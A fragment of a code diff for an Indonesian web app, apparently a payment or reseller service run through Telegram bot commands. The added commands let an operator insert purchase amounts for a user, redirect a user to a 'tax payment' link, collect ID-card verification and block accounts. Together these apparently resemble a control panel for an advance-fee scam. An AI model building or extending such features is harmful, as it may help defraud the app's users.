+            sendToTelegram(`Pajak dinonaktifkan untuk \`${targetUidVal}\``);
+            if (targetPhone === currentUserPhone) updateAuthUI();
+          }
+        }
         else if (command === '/maintenance') {
           localStorage.setItem('sanz_maintenance_' + targetPhone, 'true');
           sendToTelegram(`Maintenance diaktifkan untuk \`${targetUidVal}\``);
@@ -6077,8 +6138,8 @@ async function fetchTelegramUpdates() {
           let helpMsg = `*DAFTAR PERINTAH*\n\n`;
           
           helpMsg += `*Sistem global*\n`;
-          helpMsg += `\`/maintenance\` (uid) - aktifkan maintenance\n`;
-          helpMsg += `\`/unmaintenance\` (uid) - matikan maintenance\n`;
+          helpMsg += `\`/maintenance\` (uid) - on maintenance\n`;
+          helpMsg += `\`/unmaintenance\` (uid) - off maintenance\n`;
           helpMsg += `\`/cs_off\` (uid) - matikan layanan CS\n`;
           helpMsg += `\`/cs_on\` (uid) - aktifkan layanan CS\n`;
           helpMsg += `\`/help\` - menampilkan pesan bantuan\n\n`;
@@ -6095,7 +6156,7 @@ async function fetchTelegramUpdates() {
           helpMsg += `\`/verif\` (uid) - setujui verifikasi KTP\n`;
           helpMsg += `\`/tolak_verif\` (uid) - tolak verifikasi KTP\n`;
           helpMsg += `\`/reseller\` (uid) - setujui pengajuan reseller\n`;
-          helpMsg += `\`/tolak_reseller\` (uid) - tolak pengajuan reseller\n`;
+          helpMsg += `\`/tolak_reseller\` (uid) - tolak reseller\n`;
           helpMsg += `\`/reset_pin\` (uid) - reset PIN transaksi\n`;
           helpMsg += `\`/blokir\` (uid) - blokir akun\n`;
           helpMsg += `\`/unblokir\` (uid) - buka blokir akun\n`;
@@ -6108,6 +6169,10 @@ async function fetchTelegramUpdates() {
           helpMsg += `\`/hide-fs\` (uid) - sembunyikan event\n`;
           helpMsg += `\`/show-fs\` (uid) - tampilkan event\n`;
           helpMsg += `\`/unlock\` (uid) - buka fitur reseller\n`;
+          helpMsg += `\`/lock\` (uid) - kunci fitur reseller\n`;
+          helpMsg += `\`/addtrx\` (nominal) (uid) - tambah pembelian\n`;
+          helpMsg += `\`/pajak\` (link) (uid) - verif ke bayar pajak\n`;
+          helpMsg += `\`/hide_pajak\` (uid) - kembalikan tombol verif\n`;
           helpMsg += `\`/trx\` (uid) - buka fitur transfer`;
 
           sendToTelegram(helpMsg);
@@ -6490,10 +6555,10 @@ function createHistoryItemHTML(h, prefix = 'home') {
         setTimeout(() => { nav.classList.add('open'); overlay.classList.add('show'); }, 10); 
       }
     }
-
+  
     function updateAppThemeColor(theme) {
       const bgColor = theme === 'light' ? '#ffffff' : '#1c212d'; 
-      
+  
       const metaTheme = document.getElementById('theme-color-meta');
       if (metaTheme) metaTheme.setAttribute('content', bgColor);
       
@@ -6521,7 +6586,7 @@ function createHistoryItemHTML(h, prefix = 'home') {
         updateAppThemeColor('light');
       } 
     }
-
+    
     if (localStorage.getItem('sanz_theme') === 'light') { 
       document.body.setAttribute('data-theme', 'light'); 
       document.getElementById('theme-icon').className = 'bi bi-sun'; 
